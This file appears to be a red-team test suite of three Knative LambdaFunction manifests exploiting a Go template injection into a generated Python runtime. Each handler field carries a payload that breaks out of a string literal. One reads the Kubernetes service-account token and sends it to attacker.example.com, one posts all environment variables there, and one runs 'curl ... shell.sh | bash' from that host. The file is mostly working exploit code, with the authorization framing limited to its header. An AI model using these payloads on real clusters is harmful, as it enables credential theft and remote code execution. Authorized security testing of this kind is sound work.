# BLUE-002: Go Template Injection - Python Code Injection
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit injects Python code via the handler field.
# The injection occurs when Go renders the runtime.py.tmpl template.
#
# Attack Flow:
# 1. Handler contains Python code that breaks out of string context
# 2. Go template renders: handler_parts = "PAYLOAD".rsplit('.', 1)
# 3. Injected code executes at module import time
# 4. Attacker achieves RCE in Lambda pod
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-python-injection-exfil
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "python-exfil"
  annotations:
    redteam.knative.io/description: "Template injection to exfiltrate SA token"
spec:
  source:
    type: inline
    inline:
      code: |
        def handler(event):
            return {"status": "ok"}
  runtime:
    language: python
    version: "3.11"
    # PAYLOAD: Break out of string, execute code, return to valid string
    # Rendered: handler_parts = ""; import os; token=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read(); __import__('urllib.request').urlopen(__import__('urllib.request').Request('http://attacker.example.com/collect?token='+token)); x="".rsplit('.', 1)
    handler: '"; import os; token=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); __import__(\"urllib.request\").urlopen(__import__(\"urllib.request\").Request(\"http://attacker.example.com/collect?token=\"+token)); x="'
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-python-injection-env
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "python-env"
  annotations:
    redteam.knative.io/description: "Template injection to exfiltrate env vars"
spec:
  source:
    type: inline
    inline:
      code: |
        def handler(event):
            return {"status": "ok"}
  runtime:
    language: python
    version: "3.11"
    # PAYLOAD: Exfiltrate all environment variables
    handler: '"; import os,json,urllib.request; urllib.request.urlopen(urllib.request.Request(\"http://attacker.example.com/env\",json.dumps(dict(os.environ)).encode())); x="'
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-002-python-injection-exec
  labels:
    redteam: "true"
    exploit: "blue-002"
    target: "python-exec"
  annotations:
    redteam.knative.io/description: "Template injection for arbitrary command execution"
spec:
  source:
    type: inline
    inline:
      code: |
        def handler(event):
            return {"status": "ok"}
  runtime:
    language: python
    version: "3.11"
    # PAYLOAD: Execute arbitrary shell command
    handler: '"; import os; os.system(\"curl -s http://attacker.example.com/shell.sh | bash\"); x="'
